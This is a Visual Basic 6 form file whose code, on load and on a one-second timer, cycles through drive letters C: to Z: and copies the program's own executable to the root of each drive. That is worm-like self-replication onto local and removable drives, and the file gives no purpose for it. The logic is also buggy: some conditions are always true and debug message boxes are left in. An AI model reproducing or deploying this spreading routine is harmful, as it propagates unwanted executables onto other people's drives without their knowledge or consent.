VERSION 5.00
Begin VB.Form Form2 
   Caption         =   "Form1"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   LinkTopic       =   "Form1"
   ScaleHeight     =   3015
   ScaleWidth      =   4560
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   1680
      Top             =   1320
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   360
      TabIndex        =   0
      Top             =   360
      Width           =   3135
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim FSO As New FileSystemObject
Dim F1 As File
Dim Dr(100) As Drive
Dim i, SSt, j


Private Sub Form_Load()
On Error Resume Next
i = DC()
End Sub


Private Sub Drive1_Change()
On Error Resume Next
i = DC()
End Sub


Private Sub Timer1_Timer()
On Error GoTo Error
Drive1.Refresh
Drive1.ListIndex = 1 + Drive1.ListIndex
If eor = 68 Or 381 Then
If j = 1 Then
Drive1.ListIndex = 2 + Drive1.ListIndex
ElseIf j = 2 Then
Drive1.ListIndex = 3 + Drive1.ListIndex
ElseIf j = 3 Then
Drive1.ListIndex = 4 + Drive1.ListIndex
Else
Drive1.ListIndex = 1
End If
End If
Exit Sub
Error:
MsgBox Err.Number & "   Timer error   " & Err.Description
eor = Err.Number
If eor = 381 Or 68 Then j = j + 1
MsgBox j
Resume Next
End Sub


Function DC()
If Drive1.ListIndex = 0 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("c:\")
SSt = "c:\"
ElseIf Drive1.ListIndex = 1 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("d:\")
SSt = "d:\"
ElseIf Drive1.ListIndex = 2 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("e:\")
SSt = "e:\"
ElseIf Drive1.ListIndex = 3 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("f:\")
SSt = "f:\"
ElseIf Drive1.ListIndex = 4 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("g:\")
SSt = "g:\"
ElseIf Drive1.ListIndex = 5 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("h:\")
SSt = "h:\"
ElseIf Drive1.ListIndex = 6 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("i:\")
SSt = "i:\"
ElseIf Drive1.ListIndex = 7 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("j:\")
SSt = "j:\"
ElseIf Drive1.ListIndex = 8 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("k:\")
SSt = "k:\"
ElseIf Drive1.ListIndex = 9 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("l:\")
SSt = "l:\"
ElseIf Drive1.ListIndex = 10 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("m:\")
SSt = "m:\"
ElseIf Drive1.ListIndex = 11 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("n:\")
SSt = "n:\"
ElseIf Drive1.ListIndex = 12 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("o:\")
SSt = "o:\"
ElseIf Drive1.ListIndex = 13 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("p:\")
SSt = "p:\"
ElseIf Drive1.ListIndex = 14 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("q:\")
SSt = "q:\"
ElseIf Drive1.ListIndex = 15 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("r:\")
SSt = "r:\"
ElseIf Drive1.ListIndex = 16 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("s:\")
SSt = "s:\"
ElseIf Drive1.ListIndex = 17 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("t:\")
SSt = "t:\"
ElseIf Drive1.ListIndex = 18 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("u:\")
SSt = "u:\"
ElseIf Drive1.ListIndex = 19 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("v:\")
SSt = "v:\"
ElseIf Drive1.ListIndex = 20 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("w:\")
SSt = "w:\"
ElseIf Drive1.ListIndex = 21 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("x:\")
SSt = "x:\"
ElseIf Drive1.ListIndex = 22 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("y:\")
SSt = "y:\"
ElseIf Drive1.ListIndex = 23 Then
Set Dr(Drive1.ListIndex) = FSO.GetDrive("z:\")
SSt = "z:\"
End If


Set F1 = FSO.GetFile(App.Path & "/" & App.EXEName & ".exe")
F1.Copy (SSt)


End Function
